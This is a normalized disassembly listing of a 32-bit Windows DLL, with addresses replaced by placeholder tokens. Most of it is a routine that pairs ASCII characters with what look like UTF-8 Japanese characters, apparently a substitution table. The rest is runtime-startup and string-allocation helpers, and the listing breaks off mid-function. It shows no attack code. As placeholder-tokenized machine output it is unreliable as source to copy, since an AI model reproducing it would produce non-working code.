mov [ ebp - 0x4 ] 0xbc9cec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x9ca1eb
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7e
mov [ ebp - 0x4 ] 0x9890eb
call sub_10009600
mov [ eax ] 0x23
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8092ed
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0xac97ec
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x5c
mov [ ebp - 0x4 ] 0x90a7eb
call sub_10009600
mov [ eax ] 0x3b
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb09aec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0x848feb
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x5e
mov [ ebp - 0x4 ] 0xac82ec
call sub_10009600
mov [ eax ] 0x61
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbcb3ea
call sub_10009600
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x98bdec
push ecx
mov ecx rw-data
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x63
mov [ ebp - 0x4 ] 0xb682ec
call sub_10009600
mov [ eax ] 0x64
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x88a7eb
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0xb49aec
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x66
mov [ ebp - 0x4 ] 0xb88aed
call sub_10009600
mov [ eax ] 0x67
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x85b1ec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0xa498ec
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x69
mov [ ebp - 0x4 ] 0x8ca0eb
call sub_10009600
mov [ eax ] 0x6a
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x80a7ec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0xb98beb
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6c
mov [ ebp - 0x4 ] 0xbcb7ea
call sub_10009600
mov [ eax ] 0x6d
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x909eec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0x998feb
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6f
mov [ ebp - 0x4 ] 0xa8b0ec
call sub_10009600
mov [ eax ] 0x70
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c9dec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9d8bec
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x72
mov [ ebp - 0x4 ] 0xbcaceb
call sub_10009600
mov [ eax ] 0x73
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb094eb
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x849cec
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x75
mov [ ebp - 0x4 ] 0xb082ec
call sub_10009600
mov [ eax ] 0x76
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbb9ceb
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0x9c95ed
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x78
mov [ ebp - 0x4 ] 0x81b6ea
call sub_10009600
mov [ eax ] 0x79
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x95a0ec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0x989dec
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x31
mov [ ebp - 0x4 ] 0xa09cec
call sub_10009600
mov [ eax ] 0x32
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa5a0eb
call sub_10009600
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xa493eb
push ecx
mov ecx rw-data
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x34
mov [ ebp - 0x4 ] 0x8495ec
call sub_10009600
mov [ eax ] 0x35
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb49dec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0xb496ec
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x37
mov [ ebp - 0x4 ] 0xb8a8eb
call sub_10009600
mov [ eax ] 0x38
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x888beb
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0xbc9deb
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x30
mov [ ebp - 0x4 ] 0x948aeb
call sub_10009600
mov [ eax ] 0x3a
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x83b2ea
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0x849dec
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2e
mov [ ebp - 0x4 ] 0x9c8bec
call sub_10009600
mov [ eax ] 0x3f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb89dec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x26
mov [ ebp - 0x4 ] 0x9895ed
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2d
mov [ ebp - 0x4 ] 0xa48beb
call sub_10009600
mov [ eax ] 0x5f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb0b8ea
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xb781e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x60
mov [ ebp - 0x4 ] 0x8881e3
call sub_10009600
mov [ eax ] 0x3c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8381e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3e
mov [ ebp - 0x4 ] 0x8581e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x8681e3
call sub_10009600
mov [ eax ] 0x7e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8781e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x23
mov [ ebp - 0x4 ] 0x8981e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0x8e81e3
call sub_10009600
mov [ eax ] 0x5c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9081e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3b
mov [ ebp - 0x4 ] 0xba81e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0xb981e3
call sub_10009600
mov [ eax ] 0x5e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8a81e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x61
mov [ ebp - 0x4 ] 0x9881e3
push ecx
mov ecx rw-data
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x8481e3
call sub_10009600
mov [ eax ] 0x63
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9581e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x64
mov [ ebp - 0x4 ] 0x9382e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0xaf81e3
call sub_10009600
mov [ eax ] 0x66
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8281e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x67
mov [ ebp - 0x4 ] 0x8f82e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0x8782e3
call sub_10009600
mov [ eax ] 0x69
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8082e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6a
mov [ ebp - 0x4 ] 0x9981e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0xb381e3
call sub_10009600
mov [ eax ] 0x6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9282e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6d
mov [ ebp - 0x4 ] 0x8b81e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0x9181e3
call sub_10009600
mov [ eax ] 0x6f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbe81e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x70
mov [ ebp - 0x4 ] 0x9781e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9f81e3
call sub_10009600
mov [ eax ] 0x72
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8280e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x73
mov [ ebp - 0x4 ] 0x9381e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x8d82e3
call sub_10009600
mov [ eax ] 0x75
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c81e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x76
mov [ ebp - 0x4 ] 0xa381e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0xa681e3
call sub_10009600
mov [ eax ] 0x78
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8a82e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x79
mov [ ebp - 0x4 ] 0x8c82e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0xaa81e3
call sub_10009600
mov [ eax ] 0x31
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xae81e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x32
mov [ ebp - 0x4 ] 0xab81e3
push ecx
mov ecx rw-data
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xa181e3
call sub_10009600
mov [ eax ] 0x34
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c80e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x35
mov [ ebp - 0x4 ] 0x8382e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0x9e81e3
call sub_10009600
mov [ eax ] 0x37
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8d80e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x38
mov [ ebp - 0x4 ] 0xa981e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0x8282e3
call sub_10009600
mov [ eax ] 0x30
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8d81e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0x8b82e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3a
mov [ ebp - 0x4 ] 0xa881e3
call sub_10009600
mov [ eax ] 0x2e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8180e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2d
mov [ ebp - 0x4 ] 0xad81e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3f
mov [ ebp - 0x4 ] 0x9a81e3
call sub_10009600
mov [ eax ] 0x26
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8f81e3
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x5f
mov [ ebp - 0x4 ] 0x8181e3
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xacace7
call sub_10009600
mov [ eax ] 0x3c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x80b8e4
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3e
mov [ ebp - 0x4 ] 0x809ce6
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x8cbee5
call sub_10009600
mov [ eax ] 0x7e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb9e4
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x23
mov [ ebp - 0x4 ] 0x9abae4
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0x9f93e5
call sub_10009600
mov [ eax ] 0x5c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb6afe8
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3b
mov [ ebp - 0x4 ] 0x84bfe4
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0x99b2e6
call sub_10009600
mov [ eax ] 0x5e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9fb9e4
call sub_10009600
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x61
mov [ ebp - 0x4 ] 0xb1a8e8
push ecx
mov ecx rw-data
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x8fb0e5
call sub_10009600
mov [ eax ] 0x63
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb890e5
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x64
mov [ ebp - 0x4 ] 0x9985e7
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0x8580e8
call sub_10009600
mov [ eax ] 0x66
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb795e9
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x67
mov [ ebp - 0x4 ] 0x9a80e9
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0xb1a9e8
call sub_10009600
mov [ eax ] 0x69
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb89be7
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6a
mov [ ebp - 0x4 ] 0xb695e7
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0x8ca1e8
call sub_10009600
mov [ eax ] 0x6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xba82e7
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6d
mov [ ebp - 0x4 ] 0xaaa6e8
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0xa1bfe4
call sub_10009600
mov [ eax ] 0x6f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x87abe8
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x70
mov [ ebp - 0x4 ] 0xb088e6
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9183e6
call sub_10009600
mov [ eax ] 0x72
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xad88e7
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x73
mov [ ebp - 0x4 ] 0xa6b5e7
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x88bae4
call sub_10009600
mov [ eax ] 0x75
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9389e6
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x76
mov [ ebp - 0x4 ] 0xb08de5
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0x9fa9e6
call sub_10009600
mov [ eax ] 0x78
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb4e6
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x79
mov [ ebp - 0x4 ] 0x87b6e6
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0x9cb5e6
call sub_10009600
mov [ eax ] 0x31
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9081e6
call sub_10009600
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x32
mov [ ebp - 0x4 ] 0xbc87e6
push ecx
mov ecx rw-data
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xb3aee5
call sub_10009600
mov [ eax ] 0x34
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9580e6
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x35
mov [ ebp - 0x4 ] 0x849ae7
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0x8785e5
call sub_10009600
mov [ eax ] 0x37
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8b89e6
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x38
mov [ ebp - 0x4 ] 0xbdb1e6
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0x8abbe8
call sub_10009600
mov [ eax ] 0x30
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb49be7
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3a
mov [ ebp - 0x4 ] 0x878de5
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0xb09ce5
call sub_10009600
mov [ eax ] 0x2e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb8e4
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3f
mov [ ebp - 0x4 ] 0xaeaee5
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x26
mov [ ebp - 0x4 ] 0xbc99e7
call sub_10009600
mov [ eax ] 0x2d
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa8a1e8
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xb9a0e6
call sub_10009600
mov [ eax ] 0x5f
mov esp ebp
pop ebp
retn
sub_10066e80
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f55b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10041f76
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_1005ac7e
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_10050ee7
mov [ edi ] eax
call sub_1005b9b6
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_100067d1
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_1002470e
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10066f8a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_10049900
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10066fab
push 0x8
push r--data
call sub_10078b50
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_100483a0
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_10060603
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_10064c8e
push 0x214
push 0x1
call sub_10025450
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_1000fce5
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_10062397
mov [ rw-data ] eax
call sub_1002d54a
test eax eax
jns r-xdata
call sub_100264e5
jmp r-xdata
call sub_10078b95
retn 0xc
xor eax eax
inc eax
push edi
call sub_1004df54
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_10005b26
call sub_100624df
test eax eax
js r-xdata
call sub_1000e9b8
jmp r-xdata
push esi
call sub_10020a90
pop ecx
jmp r-xdata
push edi
push esi
call sub_1000a5ee
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10067084
jmp r-xdata
call sub_1006a40d
call sub_1000e9b8
call sub_100264e5
call sub_1006a40d
jmp r-xdata
call sub_100247e5
test eax eax
js r-xdata
push 0x0
call sub_10045f46
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10067110
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x8 ] eax
call sub_10078600
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
sub_10067170
test ebx ebx
je r-xdata
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x4 ] eax
call sub_10078600
add esp 0xc
pop esi
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x4 ] 0x0
sub_100671c0
push ebp
mov ebp esp
sub esp 0x2ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x208
lea eax [ ebp - 0x2ac ]
push 0x0
push eax
call sub_10078970
mov ecx [ r--data ]
